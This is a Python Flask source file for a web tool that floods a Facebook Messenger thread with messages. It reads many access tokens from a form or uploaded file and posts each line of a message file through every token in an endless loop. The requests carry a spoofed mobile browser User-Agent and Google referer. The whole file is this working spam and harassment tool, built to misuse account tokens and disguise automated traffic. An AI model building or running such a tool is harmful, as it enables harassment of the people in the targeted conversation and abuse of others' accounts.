from flask import Flask, request, render_template_string
import requests
from threading import Thread, Event
import time
import random
import string

app = Flask(__name__)

# Headers for requests
HEADERS = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9',
    'Referer': 'https://www.google.com'
}

# Dictionary to store threads and stop events
stop_events = {}
threads = {}

def send_messages(access_tokens, thread_id, prefix, time_interval, messages, task_id):
    """Function to send messages continuously until stopped."""
    stop_event = stop_events[task_id]
    while not stop_event.is_set():
        for message in messages:
            if stop_event.is_set():
                break
            for access_token in access_tokens:
                api_url = f'https://graph.facebook.com/v17.0/t_{thread_id}/'
                full_message = f"{prefix} {message}"
                params = {'access_token': access_token, 'message': full_message}

                try:
                    response = requests.post(api_url, data=params, headers=HEADERS, timeout=10)
                    if response.status_code == 200:
                        print(f"✔ Message Sent: {full_message}")
                    else:
                        print(f"❌ Message Failed: {response.text}")
                except requests.exceptions.RequestException as e:
                    print(f"⚠ Error: {e}")

                time.sleep(time_interval)

@app.route('/', methods=['GET', 'POST'])
def index():
    """Main route to start message sending."""
    if request.method == 'POST':
        token_option = request.form.get('tokenOption')

        if token_option == 'single':
            access_tokens = [request.form.get('singleToken').strip()]
        else:
            token_file = request.files['tokenFile']
            access_tokens = token_file.read().decode().strip().splitlines()

        thread_id = request.form.get('threadId').strip()
        prefix = request.form.get('prefix').strip()
        time_interval = int(request.form.get('time'))
        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        # Generate a random task ID
        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))

        stop_events[task_id] = Event()
        thread = Thread(target=send_messages, args=(access_tokens, thread_id, prefix, time_interval, messages, task_id))
        thread.start()
        threads[task_id] = thread

        return f'Task started with ID: {task_id}'

    return render_template_string(open("index.html", encoding="utf-8").read())

@app.route('/stop', methods=['POST'])
def stop_task():
    """Route to stop a running task."""
    task_id = request.form.get('taskId').strip()
    if task_id in stop_events:
        stop_events[task_id].set()
        return f'Task {task_id} stopped successfully.'
    return 'Invalid Task ID.'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
